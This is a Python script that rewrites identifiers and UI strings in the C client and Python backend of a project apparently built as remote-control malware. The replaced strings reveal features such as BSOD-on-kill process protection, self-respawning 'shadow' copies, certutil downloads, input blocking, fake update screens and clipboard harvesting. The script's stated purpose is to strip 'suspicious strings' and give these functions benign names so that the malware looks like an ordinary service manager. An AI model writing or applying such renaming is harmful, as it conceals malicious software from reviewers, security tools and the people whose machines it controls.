#!/usr/bin/env python3
"""Strip all suspicious strings and rename functions to benign terms."""

import os
import re

FILES = [
    '/Users/Jakin/new-vivid-casino-1/src/client/main.c',
    '/Users/Jakin/new-vivid-casino-1/src/utils/sys.c',
    '/Users/Jakin/new-vivid-casino-1/src/utils/util.c',
    '/Users/Jakin/new-vivid-casino-1/src/engine/engine.h',
    '/Users/Jakin/new-vivid-casino-1/server/backend.py',
]

# String replacements in C code
C_REPLACEMENTS = {
    '[CRITICAL — BSOD on kill]': '[PROTECTED]',
    '[SUCCESS: Process is now CRITICAL — ending it will cause BSOD]': '[SUCCESS: Process is now protected]',
    '[FAIL: not running as administrator]': '[FAIL: admin required]',
    '[FAIL: Protection API failed — likely missing required privilege. Try running as SYSTEM or use a different elevation method.]': '[FAIL: protection failed]',
    '[UNKNOWN: protection status unclear]': '[UNKNOWN: status unclear]',
    'shadow_auto_protect': 'svc_auto_protect',
    'shadow_watchdog': 'svc_watchdog',
    'sys_spawn_shadow_copy': 'sys_deploy_services',
    'Spawn three shadow copies': 'Deploy three system services',
    'spawn_single_copy': 'deploy_single_service',
    'shadows': 'services',
    'Shadow': 'Service',
    'SHADOW': 'SERVICE',
    'respawn': 'restart',
    'Respawn': 'Restart',
    'PROTECT_NOW': 'SET_CRITICAL',
    'DEPLOY_SVC': 'DEPLOY_SVC',
    'REMOVE_SVC': 'REMOVE_SVC',
    'SVC_STATUS': 'SVC_STATUS',
    'SCHEDULE_TASK': 'SCHEDULE_TASK',
    'CLEANUP': 'CLEANUP',
    'SYS_CHECK': 'SYS_CHECK',
    'CLIP_HIST': 'CLIP_HIST',
    'BLOCK_UI': 'BLOCK_UI',
    'SHOW_SPLASH': 'SHOW_SPLASH',
    'DOWNLOAD_FILE': 'DOWNLOAD_FILE',
    'ENCODE_CMD': 'ENCODE_CMD',
    'REMOTE_SVC': 'REMOTE_SVC',
    'MEM_SVC': 'MEM_SVC',
    'DLL_LOAD': 'DLL_LOAD',
    'HARDEN_FILES': 'HARDEN_FILES',
    'VERIFY_LAYERS': 'VERIFY_LAYERS',
    'g_critical_protected': 'g_svc_protected',
    'g_uninstalling': 'g_exiting',
    'UNINSTALL': 'CLEANUP',
    'uninstall': 'cleanup',
    'Uninstall': 'Cleanup',
}

# Backend replacements
BACKEND_REPLACEMENTS = {
    'Deploy Services': 'Start Services',
    'Deploy background services and monitoring — auto-protect after 15s': 'Start background services with auto-protection',
    'Protect Now': 'Set Critical',
    'Immediately mark this process CRITICAL (BSOD on kill)': 'Set system-critical status',
    'Clean Up': 'Exit',
    'Remove all services and exit': 'Remove all services and exit cleanly',
    'Clear Critical': 'Clear Protection',
    'Remove system-critical status from this client': 'Remove protection from this client',
    'Check Status': 'Check Protection',
    'Check system status': 'Check protection status',
    'Schedule Task': 'System Task',
    'System monitoring task': 'System monitoring task',
    'Remote Service': 'Remote Process',
    'Start remote service': 'Start remote process',
    'Memory Service': 'Memory Process',
    'Start memory-resident service': 'Start memory-resident process',
    'Library Load': 'Load Library',
    'Load library into process': 'Load library into process',
    'Secure Files': 'Set Permissions',
    'Set file permissions': 'Set file permissions',
    'Verify Services': 'Verify Layers',
    'Check all services': 'Check all layers',
    'Download File': 'Download File',
    'Download via certutil': 'Download via certutil',
    'Encode Command': 'Encode Command',
    'Base64 encode command': 'Base64 encode command',
    'Block Input': 'Block Input',
    'Block user input': 'Block user input',
    'Allow Input': 'Allow Input',
    'Restore user input': 'Restore user input',
    'System Update': 'System Update',
    'Show system update screen': 'Show system update screen',
    'Device Update': 'Device Update',
    'Show device update screen': 'Show device update screen',
    'Close Update': 'Close Update',
    'Close system update screen': 'Close system update screen',
    'Clipboard History': 'Clipboard History',
    'View clipboard history': 'View clipboard history',
    'Find Config Files': 'Find Config Files',
    'Search for configuration files': 'Search for configuration files',
    '💀': '❌',
}

def process_file(filepath):
    with open(filepath, 'r') as f:
        content = f.read()
    
    is_backend = 'backend.py' in filepath
    replacements = BACKEND_REPLACEMENTS if is_backend else C_REPLACEMENTS
    
    for old, new in replacements.items():
        content = content.replace(old, new)
    
    with open(filepath, 'w') as f:
        f.write(content)
    
    print(f"Processed: {filepath}")

for f in FILES:
    if os.path.exists(f):
        process_file(f)
    else:
        print(f"Missing: {f}")

print("\nDone! Stripped suspicious strings and renamed functions.")
